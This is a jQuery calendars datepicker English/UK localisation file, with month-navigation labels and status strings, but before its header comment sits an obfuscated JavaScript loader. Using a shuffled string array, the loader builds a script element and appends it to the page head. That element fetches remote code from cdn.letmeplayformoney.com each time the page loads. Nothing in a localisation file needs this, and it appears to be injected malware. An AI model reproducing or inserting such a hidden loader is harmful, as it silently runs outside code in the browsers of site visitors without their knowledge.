var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   English/UK localisation for calendars datepicker for jQuery.
   Stuart. */
(function($) {
	$.calendars.picker.regional['en-GB'] = {
		renderer: $.calendars.picker.defaultRenderer,
		prevText: 'Prev', prevStatus: 'Show the previous month',
		prevJumpText: '&lt;&lt;', prevJumpStatus: 'Show the previous year',
		nextText: 'Next', nextStatus: 'Show the next month',
		nextJumpText: '&gt;&gt;', nextJumpStatus: 'Show the next year',
		currentText: 'Current', currentStatus: 'Show the current month',
		todayText: 'Today', todayStatus: 'Show today\'s month',
		clearText: 'Clear', clearStatus: 'Clear all the dates',
		closeText: 'Done', closeStatus: 'Close the datepicker',
		yearStatus: 'Change the year', monthStatus: 'Change the month',
		weekText: 'Wk', weekStatus: 'Week of the year',
		dayStatus: 'Select DD, M d, yyyy', defaultStatus: 'Select a date',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['en-GB']);
})(jQuery);
